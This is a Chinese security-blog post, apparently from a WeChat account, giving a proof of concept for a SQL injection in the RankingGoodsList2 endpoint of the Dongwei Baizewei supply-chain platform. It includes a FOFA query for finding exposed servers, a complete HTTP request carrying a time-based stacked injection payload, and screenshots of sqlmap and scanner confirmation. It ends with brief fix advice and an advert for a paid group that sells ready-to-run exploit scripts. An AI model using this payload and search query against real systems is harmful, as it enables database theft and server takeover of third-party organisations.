#  懂微百择唯·供应链 RankingGoodsList2 SQL注入致RCE漏洞   
Superhero  nday POC   2024-11-29 09:29  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCkYN4sZibCVo6EFo0N9b7Kib4I4N6j6Y10tynLOdgov9ibUmaNwW5yeoCbQ/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCkhic5lbbPcpxTLtLccZ04WhwDotW7g2b3zBgZeS5uvFH4dxf0tj0Rutw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCk524CiapZejYicic1Hf8LPt8qR893A3IP38J3NMmskDZjyqNkShewpibEfA/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
内容仅用于学习交流自查使用，由于传播、利用本公众号所提供的  
POC  
信息及  
POC对应脚本  
而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号nday poc及作者不为此承担任何责任，一旦造成后果请自行承担！如文章有侵权烦请及时告知，我们会立即删除文章并致歉。谢谢！  
  
  
**00******  
  
**产品简介**  
  
  
懂微科技是一家专注于办公服务行业电商解决方案的提供商，致力于为办公服务行业赋能、提升效率和核心竞争力。百择唯·供应链作为懂微科技的重要产品之一，旨在通过数字化手段优化办公服务行业的供应链管理，提升采购效率，降低采购成本，增强企业的盈利能力。适用于各种需要优化供应链管理、提升采购效率的企业。同时，通过与合作伙伴的共享共建，构建完善的供应链生态体系，提升整体运营效率和市场竞争力。  
  
  
**01******  
  
**漏洞概述**  
  
  
懂微百择唯·供应链 RankingGoodsList2 接口存在SQL注入漏洞，攻击者除了可以  
利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码,站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。  
  
  
**02******  
  
**搜索引擎**  
  
  
FOFA:  
```
body="/Content/Css/_SiteCss/"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwK47Rum3GeXH0FgdtOjtQ9mSVKZVB5TcDUVVTT6QhQm0uroeUGD0PugUc1psgSldk4CcVPvdZAyfA/640?wx_fmt=png&from=appmsg "")  
  
  
**03******  
  
**漏洞复现**  
```
POST /Goods/RankingGoodsList2 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive

goodsSortType=Recommend&goodsTypeList%5B%5D=1%';WAITFOR DELAY '0:0:5'--
```  
  
延时5秒  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwK47Rum3GeXH0FgdtOjtQ9mvjzoACzOk6xPMHNEY0K86BsHMWgECGxHlBg1z4dNQB8emDQrCHnPgA/640?wx_fmt=png&from=appmsg "")  
  
sqlmap验证  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwK47Rum3GeXH0FgdtOjtQ9mm5TVSpYgpuVD8PYqYPuDjXsGf3AX4pWjuuj7QyPtTPljE1e1ia6GEUg/640?wx_fmt=png&from=appmsg "")  
  
  
**04**  
  
**检测工具**  
  
  
nuclei  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwK47Rum3GeXH0FgdtOjtQ9mHLyHdicdo3ZNmCyDLm7JQesLgzSMMLjv70aKvzFq2hY7AErKiatLO2oA/640?wx_fmt=png&from=appmsg "")  
  
afrog  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwK47Rum3GeXH0FgdtOjtQ9mPoMic9eGURL4ELcg9ogvbElBR0mtJdK7cRxicr0EB7WicQkYLMXHPn7icA/640?wx_fmt=png&from=appmsg "")  
  
xray  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwK47Rum3GeXH0FgdtOjtQ9micL6FrCh9Cv2mCGEtl2aY8tUPoK9rZ6CLKr0K4MoFqGiaBrvjRSsV0hw/640?wx_fmt=png&from=appmsg "")  
  
  
**05******  
  
**修复建议**  
  
  
1、关闭互联网暴露面或接口设置访问权限  
  
2、升级至安全版本  
  
  
**06******  
  
**内部圈子介绍**  
  
  
1、本圈子主要是分享网上公布的1day/nday POC详情及对应检测脚本，目前POC脚本均支持xray、afrog、nuclei等三款常用工具。  
  
2、三款工具都支持内置poc+自写poc目录一起扫描。  
  
3、保持每周更新10-15个poc。  
  
4、所发布的POC脚本均已测试完毕，直接拿来即用。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwI0X77l5WtnpfTexA6RwHXSbf1x3ZyT3bhcbWzRoFLyAgHkSMk9yGaZK5FDGcSCQp9ibPcicxHXIOcg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&retryload=2&tp=webp "")  
  
  
  
